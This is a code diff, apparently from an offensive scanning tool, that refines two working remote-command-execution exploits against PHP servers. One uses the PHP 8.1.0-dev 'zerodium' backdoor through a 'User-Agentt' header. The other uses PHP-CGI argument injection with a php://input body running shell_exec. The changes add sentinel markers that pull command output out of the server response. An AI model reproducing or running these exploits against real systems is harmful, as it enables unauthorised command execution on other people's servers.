@@ -32,13 +32,29 @@ class PhpBackdoorExpService {
     return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
   }
 
+  static const _sentinel = 'PHP_RCE_OUT';
+
+  static String? _extract(String body) {
+    const s = '${_sentinel}_S';
+    const e = '${_sentinel}_E';
+    final start = body.indexOf(s);
+    final end = body.indexOf(e);
+    if (start == -1 || end == -1 || end <= start) return null;
+    return body.substring(start + s.length, end).trim();
+  }
+
   Future<String?> execRce(String cmd) async {
     try {
+      final escaped = cmd.replaceAll('"', r'\"');
       final res = await http.get(
         Uri.parse('$_base$phpPath'),
-        headers: {'User-Agentt': 'zerodiumsystem("$cmd");'},
+        headers: {
+          'User-Agentt':
+              "zerodiumecho '${_sentinel}_S';system(\"$escaped\");echo '${_sentinel}_E';",
+        },
       ).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      if (res.body.isEmpty) return null;
+      return _extract(res.body) ?? res.body;
     } catch (_) {
       return null;
     }
@@ -86,14 +102,23 @@ class PhpCgiExpService {
       final url =
           '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
       final escaped = RceEncoder.escapeDoubleQuoted(cmd);
+      const begin = 'MATRIX_CGI_BEGIN';
+      const end = 'MATRIX_CGI_END';
       final res = await http
           .post(
             Uri.parse(url),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: '<?php echo shell_exec("$escaped"); ?>',
+            body: '<?php echo "$begin"; echo shell_exec("$escaped"); echo "$end"; ?>',
           )
           .timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final body = res.body;
+      final s = body.indexOf(begin);
+      final e = body.indexOf(end);
+      if (s != -1 && e != -1 && e > s) {
+        final extracted = body.substring(s + begin.length, e).trim();
+        return extracted.isNotEmpty ? extracted : null;
+      }
+      return body.isNotEmpty ? body : null;
     } catch (_) {
       return null;
     }
